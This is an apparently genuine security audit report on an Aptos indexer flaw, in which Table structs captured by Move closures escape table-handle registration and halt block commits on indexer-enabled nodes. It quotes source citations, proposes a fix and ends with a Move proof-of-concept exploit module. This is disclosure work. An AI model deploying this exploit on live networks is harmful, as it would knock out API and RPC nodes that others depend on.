# Audit Report

## Title
Indexer Denial of Service via Table Handles in Closure Captured Values

## Summary
The indexer's `parse_move_value()` function fails to extract table handles from `AnnotatedMoveValue::RawStruct` variants, which are used to represent closure-captured values. This allows an attacker to create a closure that captures a Table struct, causing the indexer to miss the table handle registration. When table items are subsequently written, the indexer cannot parse them and fails with a fatal error, preventing nodes with indexer enabled from committing blocks.

## Finding Description
The vulnerability exists in the table handle extraction logic within the indexer's value parser. When processing Move values, the indexer distinguishes between two struct representations:

**For AnnotatedMoveValue::Struct** (with full type information): [1](#0-0) 

The code checks if the struct is a Table using `is_table()` and extracts the table handle and type information.

**For AnnotatedMoveValue::RawStruct** (without type information): [2](#0-1) 

The code only recursively processes field values without any table detection logic.

`RawStruct` variants are created when values use runtime type layouts, which occurs for closure-captured values: [3](#0-2) 

Since Move closures can capture Table structs (both have the `store` ability): [4](#0-3) 

An attacker can create a closure that captures a Table, store it in a resource, and the indexer will fail to register the table handle.

**Attack Flow:**
1. Attacker deploys Move module that creates closure capturing a Table struct
2. Closure is stored in a resource via `move_to()`
3. Indexer processes the resource and encounters `AnnotatedMoveValue::Closure`
4. Closure's captured values are represented as `RawStruct` 
5. Table handle extraction is skipped
6. Later transaction writes to that table
7. Indexer encounters `StateKeyInner::TableItem` for unknown handle
8. Indexer adds item to `pending_on` map: [5](#0-4) 

9. At commit, `finish()` validates `pending_on` is empty: [6](#0-5) 

10. Error propagates up through `post_commit()`: [7](#0-6) 

11. This fails `commit_ledger()`: [8](#0-7) 

12. Node cannot commit blocks (liveness failure)

## Impact Explanation
This is **High Severity** per Aptos bug bounty criteria: "Validator node slowdowns, API crashes".

The vulnerability causes:
- **Node Liveness Failure**: Nodes with indexer enabled cannot commit blocks containing writes to the affected table
- **API Service Disruption**: API nodes typically run with indexer enabled and would become unavailable
- **Cascading Failures**: Multiple nodes could be affected if the malicious closure is widely deployed

While the indexer is optional, it is commonly enabled for:
- API/fullnode operations requiring table info lookups
- Nodes providing RPC services
- Infrastructure supporting dApps

The impact is limited to nodes with indexer enabled (check at line 636): [9](#0-8) 

However, this remains High Severity as it can cause operational failures for critical infrastructure nodes.

## Likelihood Explanation
**Likelihood: Medium-High**

**Attacker Requirements:**
- Deploy a Move module with a closure capturing a Table (public action)
- Store the closure in a resource (standard Move operation)
- Write to the captured table (trigger via subsequent transaction)

**Feasibility:**
- Move supports closures with `store` ability that can capture Tables
- Demonstrated in test code: [10](#0-9) 

- No special permissions required
- Attack can be executed by any user deploying a module

**Complexity:**
- Low technical complexity
- Well-documented Move features
- Predictable failure mode

## Recommendation
Add table detection logic for `RawStruct` variants. The fix should check if the runtime type layout matches a Table structure (single Address field) and attempt to extract table handles even without full type information.

**Proposed Fix:**
```rust
AnnotatedMoveValue::RawStruct(struct_value) => {
    // Check if this could be a Table based on structure
    // Tables have a single field: handle (address)
    if struct_value.field_values.len() == 1 {
        if let AnnotatedMoveValue::Address(handle) = &struct_value.field_values[0] {
            // Potentially a table, but we can't determine types without metadata
            // Log warning and continue - table info will be registered when first accessed
            aptos_logger::warn!(
                "Encountered potential table handle {:?} in RawStruct without type info",
                handle
            );
        }
    }
    
    for val in &struct_value.field_values {
        self.parse_move_value(val)?
    }
}
```

**Better Solution:** Modify closure serialization to preserve sufficient type metadata for table detection, or maintain a runtime registry of table handles created during transaction execution.

## Proof of Concept
```move
module attacker::exploit {
    use aptos_std::table::{Self, Table};
    
    struct ClosureStore has key {
        // Closure capturing a Table - will be serialized as RawStruct
        add_to_table: |u64| has store,
    }
    
    public entry fun deploy_exploit(account: &signer) {
        // Create table that will never be directly stored
        let t = table::new<u64, u64>();
        
        // Capture table in closure - indexer will miss this
        let add_fn = |x| {
            table::add(&mut t, x, x * 2);
        };
        
        // Store closure (table handle not indexed)
        move_to(account, ClosureStore { add_to_table: add_fn });
    }
    
    public entry fun trigger_failure(account: &signer, value: u64) acquires ClosureStore {
        let addr = std::signer::address_of(account);
        let store = borrow_global<ClosureStore>(addr);
        
        // Call closure - writes to unindexed table
        // This transaction will cause indexer failure
        (store.add_to_table)(value);
    }
}
```

**Expected Behavior:**
1. Deploy module and call `deploy_exploit()` - succeeds, indexer processes without error
2. Call `trigger_failure()` - transaction succeeds on-chain, but indexer fails with:
   ```
   "There is still pending table items to parse due to unknown table info for table handles: [handle]"
   ```
3. Node with indexer enabled cannot commit subsequent blocks

## Notes
- This vulnerability only affects nodes with the internal indexer enabled (configured via `InternalIndexerDBConfig`)
- Validator consensus nodes without indexer enabled are unaffected
- The issue stems from the fundamental limitation that closure captured values use runtime layouts without full type metadata
- A comprehensive fix may require architectural changes to how closure serialization preserves type information

### Citations

**File:** storage/indexer/src/lib.rs (L127-138)
```rust
        match table_info_parser.finish(&mut batch) {
            Ok(_) => {},
            Err(err) => {
                aptos_logger::error!(first_version = first_version, end_version = end_version, error = ?&err);
                write_sets
                    .iter()
                    .enumerate()
                    .for_each(|(i, write_set)| {
                        aptos_logger::error!(version = first_version as usize + i, write_set = ?write_set);
                    });
                db_other_bail!("Failed to parse table info: {:?}", err);
            },
```

**File:** storage/indexer/src/lib.rs (L211-224)
```rust
    fn parse_table_item(&mut self, handle: TableHandle, bytes: &Bytes) -> Result<()> {
        match self.get_table_info(handle)? {
            Some(table_info) => {
                self.parse_move_value(&self.annotator.view_value(&table_info.value_type, bytes)?)?;
            },
            None => {
                self.pending_on
                    .entry(handle)
                    .or_default()
                    .push(bytes.clone());
            },
        }
        Ok(())
    }
```

**File:** storage/indexer/src/lib.rs (L233-253)
```rust
            AnnotatedMoveValue::Struct(struct_value) => {
                let struct_tag = &struct_value.ty_tag;
                if Self::is_table(struct_tag) {
                    assert_eq!(struct_tag.type_args.len(), 2);
                    let table_info = TableInfo {
                        key_type: struct_tag.type_args[0].clone(),
                        value_type: struct_tag.type_args[1].clone(),
                    };
                    let table_handle = match &struct_value.value[0] {
                        (name, AnnotatedMoveValue::Address(handle)) => {
                            assert_eq!(name.as_ref(), ident_str!("handle"));
                            TableHandle(*handle)
                        },
                        _ => db_other_bail!("Table struct malformed. {:?}", struct_value),
                    };
                    self.save_table_info(table_handle, table_info)?;
                } else {
                    for (_identifier, field) in &struct_value.value {
                        self.parse_move_value(field)?;
                    }
                }
```

**File:** storage/indexer/src/lib.rs (L255-259)
```rust
            AnnotatedMoveValue::RawStruct(struct_value) => {
                for val in &struct_value.field_values {
                    self.parse_move_value(val)?
                }
            },
```

**File:** storage/indexer/src/lib.rs (L311-316)
```rust
    fn finish(self, batch: &mut SchemaBatch) -> Result<bool> {
        db_ensure!(
            self.pending_on.is_empty(),
            "There is still pending table items to parse due to unknown table info for table handles: {:?}",
            self.pending_on.keys(),
        );
```

**File:** third_party/move/tools/move-resource-viewer/src/lib.rs (L920-922)
```rust
            (MoveValue::Struct(s), FatType::Runtime(_) | FatType::RuntimeVariants(_)) => {
                AnnotatedMoveValue::RawStruct(self.annotate_raw_struct(s, ty, limit)?)
            },
```

**File:** aptos-move/framework/aptos-stdlib/sources/table.move (L12-15)
```text
    /// Type of tables
    struct Table<phantom K: copy + drop, phantom V> has store {
        handle: address,
    }
```

**File:** storage/aptosdb/src/db/aptosdb_writer.rs (L636-658)
```rust
            if let Some(indexer) = &self.indexer {
                let _timer = OTHER_TIMERS_SECONDS.timer_with(&["indexer_index"]);
                // n.b. txns_to_commit can be partial, when the control was handed over from consensus to state sync
                // where state sync won't send the pre-committed part to the DB again.
                if let Some(chunk) = chunk_opt
                    && chunk.len() == num_txns as usize
                {
                    let write_sets = chunk
                        .transaction_outputs
                        .iter()
                        .map(|t| t.write_set())
                        .collect_vec();
                    indexer.index(self.state_store.clone(), first_version, &write_sets)?;
                } else {
                    let write_sets: Vec<_> = self
                        .ledger_db
                        .write_set_db()
                        .get_write_set_iter(first_version, num_txns as usize)?
                        .try_collect()?;
                    let write_set_refs = write_sets.iter().collect_vec();
                    indexer.index(self.state_store.clone(), first_version, &write_set_refs)?;
                };
            }
```

**File:** aptos-move/e2e-move-tests/src/tests/aggregator_v2.data/function_values/sources/function_store.move (L4-13)
```text
    struct FunctionStore has key, store {
        // Capturing aggregators, snapshots or anything that contains delayed fields is not
        // allowed. This is enforced at runtime (serialization-time).
        //
        // Still, it is possible to define a resource that may try to capture the aggregator.
        // Because the aggregator is not copy, we cannot have a copyable closure capturing it.
        // Nevertheless, it is possible to have a non-copy closure that captures an aggregator
        // that can be updated by moving the resource from and back to the same address.
        apply: |u64|u64 has store,
    }
```
